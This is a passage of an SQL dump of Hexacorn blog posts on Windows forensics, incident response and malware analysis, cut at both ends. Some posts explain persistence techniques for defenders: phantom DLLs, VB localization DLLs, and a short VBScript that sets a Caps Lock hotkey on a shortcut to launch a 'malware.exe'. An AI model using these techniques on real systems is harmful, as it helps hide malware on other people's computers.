3\n\nDESCRIPT.ION\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\ncglpt9x.vxd 3\n\nDESCRIPT.ION\nTCUNINST.WUL\nTOTALCMD.EXE\n\n\nwcuninst.wul 2\n\nDESCRIPT.ION\nTCUNINST.WUL\n\n\nhistory.txt 2\n\nDESCRIPT.ION\nTCUNINST.WUL\n\n\ntcuninst.wul 2\n\nDESCRIPT.ION\nTCUNINST.EXE\n\n\nregister.rtf 2\n\nWCMD_FRA.LNG\nTCUNINST.WUL\n\n\nsize!.txt 2\n\nDESCRIPT.ION\nTCUNINST.WUL\n\n\ntotalcmd.chm 2\n\nTCUNINST.EXE\nTCUNINST.WUL\n\n\ntotalcmd.exe.manifest 2\n\nDESCRIPT.ION\nTCUNINST.WUL\n\n\ncglpt64.sys 2\n\nDESCRIPT.ION\nTCUNINST.WUL\n\n\nwcmd_deu.lng 2\n\nHISTORY.TXT\nTCUNINST.WUL\n\n\nwcmicons.inc 2\n\nDESCRIPT.ION\nTCUNINST.WUL\n\n\nno.bar 2\n\nDESCRIPT.ION\nTCUNINST.WUL\n\n\nwcmd_deu.mnu 1\n\nTCUNINST.WUL\n\n\nwcmd_pol.mnu 1\n\nTCUNINST.WUL\n\n\nwcmd_hun.mnu 1\n\nTCUNINST.WUL\n\n\nwcmd_kor.inc 1\n\nTCUNINST.WUL\n\n\nwcmd_dut.lng 1\n\nTCUNINST.WUL\n\n\nwcmd_rom.inc 1\n\nTCUNINST.WUL\n\n\nwcmd_swe.lng 1\n\nTCUNINST.WUL\n\n\nwcmd_swe.mnu 1\n\nTCUNINST.WUL\n\n\nwcmd_svn.inc 1\n\nTCUNINST.WUL\n\n\nwcmd_cz.lng 1\n\nTCUNINST.WUL\n\n\nwcmd_dut.inc 1\n\nTCUNINST.WUL\n\n\nwcmd_kor.lng 1\n\nTCUNINST.WUL\n\n\nwcmd_kor.mnu 1\n\nTCUNINST.WUL\n\n\nwcmd_cz.inc 1\n\nTCUNINST.WUL\n\n\nwcmd_fra.inc 1\n\nTCUNINST.WUL\n\n\nwcmd_rus.inc 1\n\nTCUNINST.WUL\n\n\nwcmd_cz.mnu 1\n\nTCUNINST.WUL\n\n\nwcmd_fra.mnu 1\n\nTCUNINST.WUL\n\n\nwcmd_ita.mnu 1\n\nTCUNINST.WUL\n\n\nwcmd_nor.mnu 1\n\nTCUNINST.WUL\n\n\nwcmd_esp.mnu 1\n\nTCUNINST.WUL\n\n\nwcmd_rom.mnu 1\n\nTCUNINST.WUL\n\n\nwcmd_dan.inc 1\n\nTCUNINST.WUL\n\n\nwcmd_deu.inc 1\n\nTCUNINST.WUL\n\n\nwcmd_rus.mnu 1\n\nTCUNINST.WUL\n\n\nwcmd_hun.lng 1\n\nTCUNINST.WUL\n\n\nwcmd_chn.mnu 1\n\nTCUNINST.WUL\n\n\nwcmd_eng.mnu 1\n\nTCUNINST.WUL\n\n\nwcmd_ita.lng 1\n\nTCUNINST.WUL\n\n\nwcmd_dan.mnu 1\n\nTCUNINST.WUL\n\n\nwcmd_sk.lng 1\n\nTCUNINST.WUL\n\n\nwcmd_pol.lng 1\n\nTCUNINST.WUL\n\n\nwcmd_sk.mnu 1\n\nTCUNINST.WUL\n\n\nkeyboard.txt 1\n\nTCUNINST.WUL\n\n\nwcmd_dan.lng 1\n\nTCUNINST.WUL\n\n\nwcmd_esp.lng 1\n\nTCUNINST.WUL\n\n\nwcmd_chn.inc 1\n\nTCUNINST.WUL\n\n\nwcmd_nor.lng 1\n\nTCUNINST.WUL\n\n\nwcmd_fra.lng 1\n\nTCUNINST.WUL\n\n\nwcmd_rom.lng 1\n\nTCUNINST.WUL\n\n\nwcmd_esp.inc 1\n\nTCUNINST.WUL\n\n\nwcmd_chn.lng 1\n\nTCUNINST.WUL\n\n\nwcmd_svn.lng 1\n\nTCUNINST.WUL\n\n\nwcmd_ita.inc 1\n\nTCUNINST.WUL\n\n\nwcmd_rus.lng 1\n\nTCUNINST.WUL\n\n\nwcmd_dut.mnu 1\n\nTCUNINST.WUL\n\n\nwcmd_hun.inc 1\n\nTCUNINST.WUL\n\n\nwcmd_svn.mnu 1\n\nTCUNINST.WUL\n\n\n\nThe simple example – what does it tell us?\nWhile simple, the example above allows us to link all of the files produced during the installation of Total Commander and build a cluster which we could call ‘totalcmd’.\nI’d love to see a DFIR tool that would allow me to implement this sort of clustering and then help me to hide such filighted files with a click of a mouse. And then applying the same logic to other directories (f.ex. Program Files) one by one could allow us to build such clusters automatically and exclude these files from the ‘view’ as well.\nUtilizing such automatically generated clusters + clusters of whitelisted/blacklisted software (potentially focused on problematic cases) could allow to significantly reduce analysis time (on top of other data reduction techniques).\nSee the second part here.\nShare this :)', 'Clustering, Forensic Analysis, Visualisation', 'http://www.hexacorn.com/blog/2015/04/10/introducing-filighting-and-the-future-of-dfir-tools/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (238, 'Permanent Link to Wow6432Node key stats', 'Hexacorn', 'April 8, 2015 ', 'I recently came back to play with strings artifacts extracted from a decently sized sample set. Looking at a normalized, clustered data set is always a good starting point for a research. It can be very boring, but every once in a while you will find something interesting.\nTo kick it off here are some stats about Wow6432Node key that I generated overnight.\nWith 64-bit boxes becoming pretty much the norm we naturally see more and more samples referring to this Registry key. If there is one reason for us to look at this data is to find out if there are perhaps some keys under Wow6432Node that may deserve some special attention… Who knows, maybe some new persistence mechanism or some new, interesting artifact is out there waiting for someone to discover it.\nObviously, stats may be misleading so use it at your own risk. Also, not all the keys are necessarily malicious. It’s just a bunch of keys that specifically refer to Wow6432Node, and are extracted from a large sample set.\nLooking at the data below one thing strikes me immediately – the Run and RunOnce keys are pretty low on the list. Either software authors are not hardcoding them to avoid heuristic detections, or… there is really not that much software that modifies these keys directly.\n  179506 software\\wow6432node\\microsoft\\windows\\\r\n  42517 software\\wow6432node\\clients\\startmenuinternet\r\n  23631 software\\wow6432node\\microsoft\\windows\\currentversion\\uninstall\\avast\r\n   5074 software\\wow6432node\\javasoft\\java runtime environment\r\n   4859 software\\wow6432node\\javasoft\\java development kit\r\n   3274 software\\wow6432node\\beattool\r\n   3020 software\\wow6432node\\avast\r\n   2601 software\\wow6432node\\sweetim\r\n   1861 software\\wow6432node\\avira\r\n   1686 software\\wow6432node\\microsoft\\internet explorer\\extensions\\{ebd24bd3-e272-4fa3-a8ba-c5d709757cab}\r\n   1641 software\\wow6432node\\sweet-pagesoftware\r\n   1641 software\\wow6432node\\awesomehpsoftware\r\n   1639 software\\wow6432node\\webssearchessoftware\r\n   1638 software\\wow6432node\\qone8software\r\n   1638 software\\wow6432node\\microsoft\\windows\\currentversion\\uninstall\\{c4ed781c-7394-4906-aaff-d6ab64ff7c38}\r\n   1638 software\\wow6432node\\microsoft\\windows\\currentversion\\uninstall\\{889df117-14d1-44ee-9f31-c5fb5d47f68b}\r\n   1638 software\\wow6432node\\classes\\clsid\\{4aa46d49-459f-4358-b4d1-169048547c23}\r\n   1637 software\\wow6432node\\aartemissoftware\r\n   1636 software\\wow6432node\\avg\r\n   1551 software\\wow6432node\\microsoft\\windows\\currentversion\\uninstall\r\n   1515 software\\wow6432node\\avast software\r\n   1465 wow6432node\\clsid\\\r\n   1399 software\\wow6432node\\baidu security\\antivirus\r\n   1387 software\\wow6432node\\google\\chrome\\extensions\r\n   1141 \\software\\wow6432node\\baidu security\\pc faster\r\n    913 software\\wow6432node\\microsoft\\windows\\currentversion\\uninstall\\avira\r\n    623 software\\wow6432node\\omiga-plussoftware\\omiga-plushp\r\n    583 software\\wow6432node\\red gate\\\r\n    559 wow6432node\\clsid\\%s\r\n    502 software\\wow6432node\r\n    434 software\\wow6432node\\microsoft\\internet explorer\\extensions\r\n    417 software\\wow6432node\\mozilla\\mozilla firefox\r\n    403 software\\wow6432node\\microsoft\\windows\\currentversion\\uninstall\\\r\n    384 software\\wow6432node\\microsoft\\internet explorer\\toolbar\r\n    372 software\\wow6432node\\mozilla\\zvu.com\\%s\\main\r\n    372 software\\wow6432node\\mozilla\\zvu.com\r\n    363 software\\wow6432node\\microsoft\\windows\\currentversion\\run\r\n    356 software\\wow6432node\\{smartassembly}\r\n    326 software\\wow6432node\\microsoft\\office\\outlook\\addins\r\n    295 hkey_local_machine\\software\\wow6432node\\vitalwerks\\duc\r\n    281 software\\wow6432node\\babylontoolbar\\babylontoolbar\r\n    265 software\\wow6432node\\brapp\r\n    263 software\\wow6432node\\microsoft\\windows\\currentversion\\runonce\r\n    253 software\\wow6432node\\asktoolbar\\macro\r\n    215 software\\wow6432node\\mozilla\\mozilla firefox\\\r\n    204 software\\wow6432node\\realnetworks\\dlp\r\n    189 software\\wow6432node\\microsoft\\net framework setup\\ndp\\\r\n    186 software\\wow6432node\\qone8software\\qone8hp\r\n    168 software\\wow6432node\\v9software\r\n    163 software\\wow6432node\\qvo6software\\qvo6hp\r\n\r\n\nShare this :)', 'Batch Analysis, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2015/04/08/wow6432node-key-stats-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (239, 'Permanent Link to The Easter Bunny comes with a bag full of events', 'Hexacorn', 'April 5, 2015 ', 'Easter Bunny decided to make this Easter a bit more … eventful [sic!].\nNamed events are quite similar to Mutexes and Atoms. They may be handy in recognizing some malware families so here is a bunch of them that I extracted from various malware samples.\nShare this :)', 'Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2015/04/05/the-easter-bunny-comes-with-a-bag-full-of-events/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (240, 'Permanent Link to Beyond good ol’ Run key, Part 29', 'Hexacorn', 'March 13, 2015 ', 'LNK files are used by malware for many years so there is not much new about it that can be said with regards to persistence.\nExamples include:\n\nPlacing shortcut files in popular locations (Desktop, Start Menu)\nReplacing an .exe path inside the .lnk files with one pointing to a malicious executable (‘man-in-the-middle’, or a variant of a companion virus)\nExploits (as used by Stuxnet)\nEtc.\n\nThe following examples explore 2 more (but less popular) methods of leveraging LNK files as a persistence mechanism.\nHot Keys\nThe first one relies on Hot Keys. LNK files placed on a Desktop or in a Start Menu have an interesting property – they can register hot keys that may activate the respective lnk file i.e. launch them.\nThis was handy back in a day when icons on a desktop were hidden most of the time and using shortcuts allowed accessing the most popular applications w/o a need to minimize all windows, or browsing through the Start Menu. Today, the new Taskbar in Win7/8/10 + Windows+<number> combinations make this functionality pretty much obsolete. But it’s still there. And one can modify an existing Desktop/Start Menu shortcut, or create a new one that will point to a malware.\nIt will be activated anytime a specific combination of keys is hit.\nOf course, which key combination to choose is a tricky part – a wrong choice could affect running applications. One can always explore possibilities by checking the Shortcut Key section on the Shortcut Properties Window. Interestingly, manually setting the keys will almost always include a CTRL+ALT prefix (added by the OS). It limits a range of popular keys that can be entered via Shortcut Properties Window (note: some keys f.ex. F1-F12 are not prefixed):\n\nOne could bypass this restriction by setting the keys directly via COM object responsible for creation of shortcuts (IShellLink interface), or even manually modifying the .lnk file (on a binary level).\nTo demonstrate this trivial trick we can look at the following snippet of code.\nset w = CreateObject(\"Wscript.shell\")\r\nd = w.SpecialFolders(\"Desktop\")\r\nset l = w.CreateShortcut(d + \"\\foo.lnk\")\r\nl.WindowStyle = 4\r\nl.TargetPath = \"c:\\test\\malware.exe\"\r\nl.Hotkey = \"Captial\"\r\nl.Save\nIt leverages a COM IShellLink interface accessed via Visual Basic Script to create a shortcut to a c:\\test\\malware.exe file. The ‘malware’ will be activated anytime someone presses a CAPS LOCK. A trivia fact: ‘Captial’ is actually how VBS refers to a CAPS LOCK key.\nThis choice of key(s) is actually not that bad – people don’t use CAPS LOCK at all and at the same time – they often press it accidentally every once in a while. After some more tests it also looks that it does NOT affect running programs, so f.ex. if you type something, then press CAPS LOCK (malware runs), applications will still interpret CAPS LOCK and switch to capital letters. Pressing it again brings the small letters back (while malware executes again).\nA kinda similar concept applies to F1 which could be used as an alternative (people don’t use a built-in Help that often either).\nThis is how the generated shortcut looks like in the Shortcuts Properties Window:\n\nAnd this is what happens when you hit Caps Lock:\nThe c:\\test\\malware.exe is a simple program showing a message box.\nCommand line modification\nThe other way one can exploit the .LNK files is by modifying not the path to the executable itself, but by changing the command line arguments. This is in fact a technique that is actively used by malicious plugins. They use this trick to patch .LNK files pointing the Google Chrome browser to load a malicious plugin via a modified command line. The command line switch that is added is ‘–load-extension’.\nChrome uses a lot of command line arguments that could be potentially abused the same way.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2015/03/13/beyond-good-ol-run-key-part-29/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (241, 'Permanent Link to Win8 + Parental Control', 'Hexacorn', 'March 3, 2015 ', 'One of the lesser known features of Windows 8 was an introduction of Parental Control. The idea is that you can change an account type to one that can be used by children. Such account can be then both managed by  parents and also (what’s very interesting) regularly monitored.\nI was curious what it means from a forensic perspective and did a quick test to see what I can find out.\nHow to set it up?\n\nCreate a new account.\n\nTick the box to mark it as child’s account\n\nYou are done.\nYou can go to Account / User settings and set up the Family Safety options + activity reporting. By default, it’s all enabled.\n\n\nTesting\n\nSimply log off as a current user and log on as a child’s account\nWhat you will immediately see after logging on is a notification in the right corner of the screen saying ‘This account is monitored by Family Safety’\n\nRun a couple of apps\nNote: I didn’t test the web sites in this test; I am not 100% sure, but setting modification are probably traced as well – it’s all subject to further research\nIn my case I ran:\n\ncmd.exe, from there I ran calc.exe and spawned another copy of cmd.exe\nIn the new cmd.exe I ran notepad and again, started a new instance of cmd.exe\nIn the final cmd.exe instance, I launched mspaint/pbrush.exe\nEventually I also launched Task Manager via CTRL+SHIFT+ESC\nI ran it this way hoping that PID relationship will be preserved\n\n\n\n\nAnalyzing the evidence\n\nI then logged off and logged on as Admin user to review the logs\nI went to the User Settings again and… saw this:\n\nThat was surprising \nI started Process Monitor and went back to the logs.\nLuckily, Process Monitor highlighted a file of interest:\nC:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-ParentalControls%4Operational.evtx\nNow it was easy. I opened it up in MMC:\n\nLooks like the Built-in reviewing panel ignores some Windows applications.\nWhile reviewing the data in MMC I noticed the events are NOT sorted according to time (granularity of time is too low and all timestamps are ‘equal’; this is kinda… stupid)\nExporting to CSV and TSV doesn’t help as timestamps are truncated to granularity of seconds\nExporting to XML does help as timestamps are preserved with fractions e.g. 2015-03-03T17:21:49.447501700Z so we can use it to sort events properly\nYou can export the logs to an XML file via command line using wevtutil\nwevtutil qe /lf “c:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-ParentalControls%4Operational.evtx” > xml\nOnce you parse this data and cherry-pick what you need you can end up with a table as below (I loaded it into Excel and sorted it by time):\n\n\nNice! So we got the log of all applications loaded during the test and following the sequence as listed earlier.\nThe SerializedApplication column contains a serialized pair of a full path to an executable followed by the window title of the application. The serialization seems to be based on an alphabet made up of 0-9a-z and each string is prefixed with two characters that represent the length of the string.\nThe best is to explain it via examples:\n 000000000000000000000000000000000000111111111111111111111111111111111111\r\n 0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz\r\n05Paint\r\n07Notepad\r\n0nFirst Sign-in Animation\r\n0pWindows Command Processor\r\n0vc:\\windows\\system32\\notepad.exe\r\n17c:\\windows\\system32\\oobe\\firstlogonanim.exe\nI am not sure what TimeUsed means (or, more precisely – how to interpret this value).\nConfiguration\nParents can specify what apps can be ran by a child. There is also a way to block content according to rating & only allow certain list of websites (web filtering). In other words, it can work as a (kinda primitive) security control to limit access to both web sites and applications. Other options include time limits and game usage restrictions.\nConfiguration of Parental Control is preserved under the following key:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Parental Controls\n\n\nAdding filters for web means that the entries will be created under the following key:\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Parental Controls\\Users\\<SID>\\Web\\Overrides\n\nAnd similar rules apply to apps:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Parental Controls\\Users\\<SID>\\DesktopApps\n\n\nWith the filtering on, we got yet another artifact to look at which may be handy in determining what applications have been used on the system and when.\nShare this :)', 'Forensic Analysis', 'http://www.hexacorn.com/blog/2015/03/03/win8-parental-control/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (242, 'Permanent Link to De Low Life of a DLL name', 'Hexacorn', 'February 27, 2015 ', 'Coding is boring. We often re-use the same code tweaking it according to our needs. I do it all the time. Turns out that OS developers do the very same thing. It can be revealed by comparing the external names of DLLs (file names) and their internal names hidden inside the export directory.\nThe below is a list from a random Windows 7 installation\n\nbold=name in export directory\nnote: I excluded the hotifexes/updates to make the list shorter, but if you have look at them you will see that the DLLs are being updated many times and QA process still doesn’t catch them\nnote: some changes can be probably explained via historical needs (8.3 naming convention)\nthe same name inside the export directory means developer(s) simply copy&paste code for different DLLs (smalldll.dll is popular amongst them  )\n\ndummysbs.dll\n\nC:\\WINDOWS\\Microsoft.NET\\Framework\\sbs_iehost.dll\nC:\\WINDOWS\\Microsoft.NET\\Framework\\sbs_VsaVb7rt.dll\n\nexports.dll\n\nC:\\WINDOWS\\ie8\\ieencode.dll\nC:\\WINDOWS\\system32\\ieencode.dll\n\nINETCPL.dll\n\nC:\\WINDOWS\\system32\\inetcpl.cpl\n\nmpsystemstatecheck.dll\n\n<various>\\mpsyschk.dll\n\nmsconv97.pex\n\n<various>\\msconv97.dll\n\nMSMSGSC.dll\n\n<various>\\msgsc.dll\n\nPresentationHost.dll\n\nC:\\WINDOWS\\Installer\\$PatchCache$\\Managed\\5C1093C35543A0E32A41B090A305076A\\4.0.30319\\PresentationHostDLL_X86.dll\nC:\\WINDOWS\\Microsoft.NET\\Framework\\v4.0.30319\\WPF\\PresentationHost_v0400.dll\n\nsmalldll.dll\n\nC:\\WINDOWS\\system32\\MP43DMOD.dll\nC:\\WINDOWS\\system32\\MP4SDMOD.dll\nC:\\WINDOWS\\system32\\MPG4DMOD.dll\nC:\\WINDOWS\\system32\\wdfapi.dll\nC:\\WINDOWS\\system32\\wmp.ocx\nC:\\WINDOWS\\system32\\wmpcd.dll\nC:\\WINDOWS\\system32\\wmpcore.dll\nC:\\WINDOWS\\system32\\wmpui.dll\nC:\\WINDOWS\\system32\\wmsdmod.dll\nC:\\WINDOWS\\system32\\wmsdmoe2.dll\nC:\\WINDOWS\\system32\\WMVADVD.dll\nC:\\WINDOWS\\system32\\WMVADVE.DLL\nC:\\WINDOWS\\system32\\wmvdmod.dll\nC:\\WINDOWS\\system32\\wmvdmoe2.dll\n\nShare this :)', 'File Formats ZOO, Others', 'http://www.hexacorn.com/blog/2015/02/27/de-low-life-of-a-dll-name/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (243, 'Permanent Link to Beyond good ol’ Run key, Part 28', 'Hexacorn', 'February 23, 2015 ', 'I was curious if any of the phantom DLLs that I wrote about before still exist on Windows 10 TP. It turns out that they do, but less of them exist than could leveraged as a persistence mechanism when compared to the older versions of OS.\nHere is a list of groups I found; the process name is in bold and if you see the DLL name in the parenthesis (following the process name) it means that particular DLL is responsible for loading the actual phantom DLL.\n%SYSTEM%\\Dism.exe (WimProvider.DLL)\n\n%SYSTEM%\\Dism\\wimgapi.dll\n\n%SYSTEM%\\Dism.exe\n\n%SYSTEM%\\DismCore.dll\n\n%SYSTEM%\\FileHistory.exe (clr.dll)\n\n%WINDOWS%\\Microsoft.NET\\Framework\\v4.0.30319\\api-ms-win-core-winrt-l1-1-0.dll\n%WINDOWS%\\Microsoft.NET\\Framework\\v4.0.30319\\mscoree.dll\n%WINDOWS%\\Microsoft.NET\\Framework\\v4.0.30319\\ole32.dll\n%WINDOWS%\\Microsoft.NET\\Framework\\v4.0.30319\\urlmon.dll\n\n%SYSTEM%\\mmc.exe (clr.dll)\n\n%WINDOWS%\\Microsoft.Net\\assembly\\GAC_32\\mscorlib\\v4.0_4.0.0.0__b77a5c561934e089\\oleaut32.dll\n%WINDOWS%\\Microsoft.Net\\assembly\\GAC_32\\mscorlib\\v4.0_4.0.0.0__b77a5c561934e089\\shell32.dll\n%WINDOWS%\\Microsoft.Net\\assembly\\GAC_MSIL\\MIGUIControls\\v4.0_1.0.0.0__31bf3856ad364e35\\ntdll.dll\n%WINDOWS%\\Microsoft.Net\\assembly\\GAC_MSIL\\System.Windows.Forms\\v4.0_4.0.0.0__b77a5c561934e089\\comctl32.dll\n%WINDOWS%\\Microsoft.Net\\assembly\\GAC_MSIL\\System.Windows.Forms\\v4.0_4.0.0.0__b77a5c561934e089\\uxtheme.dll\n%WINDOWS%\\Microsoft.NET\\Framework\\v4.0.30319\\api-ms-win-core-winrt-l1-1-0.dll\n%WINDOWS%\\Microsoft.NET\\Framework\\v4.0.30319\\mscoree.dll\n%WINDOWS%\\Microsoft.NET\\Framework\\v4.0.30319\\ole32.dll\n%WINDOWS%\\Microsoft.NET\\Framework\\v4.0.30319\\VERSION.dll\n\n%SYSTEM%\\Narrator.exe (MSTTSEngine.DLL)\n\n%SYSTEM%\\speech\\engines\\tts\\MSTTSLocEnUS.DLL (I have not explored it, but there is a possibility that on non-English Windows it would be a different localization DLL)\n\n%SYSTEM%\\omadmclient.exe\n\ncmnet.dll\n\n%SYSTEM%\\PresentationHost.exe\n\n%WINDOWS%\\Microsoft.NET\\Framework\\v4.0.30319\\WPF\\PresentationHost_v0400.dll\n\n%SYSTEM%\\provtool.exe (ProvEngine.dll)\n\nMvHelper.dll\n\n%SYSTEM%\\SearchIndexer.exe\n\n%SYSTEM%\\msfte.dll\n%SYSTEM%\\msTracer.dll\n\n%SYSTEM%\\SearchProtocolHost.exe\n\n%SYSTEM%\\msfte.dll\n%SYSTEM%\\msTracer.dll\n\nProbably the most interesting are SearchIndexer.exe and SearchProtocolHost.exe as they are running by default. Here is a screenshot capturing the moment when %SYSTEM%\\msfte.dll is present on the system and user types something in the Search Box\n\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2015/02/23/beyond-good-ol-run-key-part-28/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (244, 'Permanent Link to Year of Sheep starts with a bag full of atoms', 'Hexacorn', 'February 19, 2015 ', 'It’s Chinese New Year so here is a bunch for atoms for ya to play with.\nHappy New Year!\np.s. I you find any mistakes, please let me know. This list SHOULD NOT be taken at its face value as there are a lot of ways for it to get contaminated. It is much shorter than list of mutants, but I hope it’s better than nothing \np.s.2. You may also grab list of mutants\nShare this :)', 'Compromise Detection, Malware Analysis', 'http://www.hexacorn.com/blog/2015/02/19/year-of-sheep-starts-with-a-bag-full-of-atoms/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (245, 'Permanent Link to Beyond good ol’ Run key, Part 27', 'Hexacorn', 'February 19, 2015 ', 'Things are never boring in the Visual Basic world. In part 20 I described how localization DLLs can be used as a potential persistence mechanism on the localized systems. Today, we will look at yet another localization feature offered by this platform.\nApplication in VB can be marked as localized by changing their internal language ID (LCID). They may also include a name for the localization DLL (two of them, actually).\nIn the example below, we can see a VB application marked as localized to German (the LCID is set to German=407h), the MSVBVM60.DLL will attempt to load the DLL marked szLangDll as well as szSecLangDll (as long as the latter is not equal to ‘*’ as in the below example).\nSo, one way to ensure persistence is to find an existing VB app on the system, modify its internal LCID to a value different than the one on a local system and then place the respective localization DLL in the system directory as described in part 20. Another way would be modifying the embedded szLangDll name to something else and such dll would be loaded. Thirdly, we could modify szSecLangDll from ‘*’ to anything we want and such DLL would be also loaded.\nThis is a pretty lame and is not far off from part 25 – a requirement to modify an executable is ridiculous for today’s standard, but I am adding it for completeness.\nBonus:\nszSecLangDll is typically marked as ‘*’ – this is an internal marker that VB uses as an indicator telling the engine NOT to load the second localization DLL. Interestingly, I have seen Korean applications where this ‘*’ was changed to a tilde. I do not know why. If such application is found on the system this could be leveraged to develop a persistence mechanism based on such a tilde-based file name.\nHave a look – we can see 3 persistence mechanisms at work here:\n\nvb6ko.dll – described in part 20\nHKLM\\SOFTWARE\\Microsoft\\VBA\\Monitors – described in part 6\n~.dll – described here as a result of Korean application using a non-standard szSecLangDll marker ‘~’ instead of ‘*’\n\n\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2015/02/19/beyond-good-ol-run-key-part-27/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (246, 'Permanent Link to Detecting APT remnants in $MFT', 'Hexacorn', 'February 18, 2015 ', 'In a post from 2012 I introduced a simple tool that was scanning $MFT for traces of flame.\nToday i decided to update the list of file names the tool recognizes to include:\n\nthe latest in many APT campaigns – credit goes to kbandla @ https://github.com/kbandla/APTnotes/\nsome tools typically used by hackers (their full and short file names)\n‘stashed data’ file names e.g. ‘1.rar’\nother file names commonly used by hackers [lots of generic names]\n\nThis is an experimental tool so do not jump if you see something in RED (well, you should not anyway, cuz it could mean you got pwned).\nJust assess it and take it from there – look for the file names highlighted by HCD on your drive. If you can’t find it, use a forensic tool to export a full list of file names. p.s. I will add a feature to include full paths in future versions – code is ready, but needs some more polishing.\nIn any case, if you you see something red you should probably look at your system anyway… If you find bugs, or False Positives pls let me know. Thanks.\nDownload the tool from here.\nExample:\nHCD ran on the system where DoubleFantasy installer was executed previously; system also contains various reversing tools e.g. ollydbg.exe and bintext.exe:\n\nLast, but not least, I am aware of some bugs, but better have something than nothing to fight clowns writing malware for governments…\nWhat’s next?\nIf you suspect something ‘funny’ you can use the following tools to extract a full filelist from $MFT:\n\nmft2csv\nfls from the Sleuthkit kit\nFTK Imager\n\nAnother way to test your system is by running LOKI by Florian Roth – a tool that scans your system for IOCs (Indicators Of Compromise) for many well-known APT campaigns.\nShare this :)', 'Compromise Detection, Forensic Analysis, HCD, Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2015/02/18/detecting-apt-remnants-in-mft/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (247, 'Permanent Link to SCCM (System Center Configuration Manager) and Incident Response – Part 2', 'Hexacorn', 'January 30, 2015 ', 'Update\nAfter I posted this piece Ryan (Thanks!) pinged me to highlight a few aspects related to SCCM which are worth mentioning, so I am adding some more notes below:\n\nFor performances reasons the indexing is often limited to certain directories and file extensions; this is a very important point and it’s good to review the inventory config and adjust it accordingly to your needs (if SCCM admins agree  )\n\nI have seen inventories limited to .exe files, and multimedia files (e.g. mp3)\n\n\nThere is an option to copy files to SCCM\nSCCM can be asked to query the environment for specific file names (even non .exe) – it is kinda similar to sweeps, but it’s relatively slow and quite a burden to the system\nYou may know SCCM as SMS (Systems Management Server), ConfigMgr 2012, ConfigMgr 2007 or ConfigMgr) – see wiki for more details\n\nOld post\nA while ago I wrote that SCCM can help IR guys to hunt for anomalies in the environment. I always wanted to come back to this topic with some more concrete examples so that I can show what is actually possible.\nAs mentioned in the first post – if you never used SCCM or don’t know what it is please ask your admin or whoever owns the ‘win’ platform in your company (the function may be called Desktop Management, Windows Admin, or sth along these lines) to give you the URL (and access rights) to the SCCM reporting tool.\nThe URL will lead you to a page where you can choose various reports presenting information about asset inventory of your company. I won’t cover the details here – all you need to do is to choose a specific report, fill-in the form and submit it to the web site. In return you will get the report.\nAn example form looks like this:\nThe screenshot comes from some random forum post so I hid the domain name to protect the innocent.\nWhen you submit this form the data will be sent to the web site using a GET request. This is cool, because it means you can dynamically change them in your browser’s address bar – it’s easy to experiment with the variable holding the file name.\nLet’s see how it works like in practice.\nThe URL to your SCCM report looks like this:\nhttp://<SCCM>/Report.asp?ReportID=<###>\nwhere:\n\nSCCM = address of your SCCM reporting page – usually sth like “SMSReporting_<org name>/”\n### – a number assigned to the report called “Computers with a specific file” (find it on the main SCCM reporting page)\n\nThe data you provide is passed via an argument called ‘variable’.\nSubmitting an example query to show all computers that host ‘tor.exe’ could look like this:\nhttp://<SCCM>/Report.asp?ReportID=<###>&variable=tor.exe\nWhen the page comes back you can get 3 types of reports:\n\nNo report, because the page timed out  – you need to use a different query (most likely, the tor.exe query won’t time out since the name is quite unique, but if you searched f.ex. for notepad.exe the chances are high).\n\nResponse object error \'ASP 0251 : 80004005\'\r\nResponse Buffer Limit Exceeded\r\n[...]\n\nNo results – this is usually good news, since it means there is no ‘tor.exe’ on any system\nThe actual list of systems hosting ‘tor.exe’ – these you need to chase after ASAP\n\nThe example report highlighting one system hosting ‘tor.exe’ looks like this:\n\nThis is a good example of an actionable data. You can now go directly to the system and investigate. You can question the owner of the system. Finally, you can remove that ‘tor.exe’ instance from the system.\nObviously, to make the best use of the tool you need to know what queries to use. There is (luckily) a long list of tool names and programs both hackers and admins (as well as stupid users) use and you can start the hunting initiative querying f.ex. 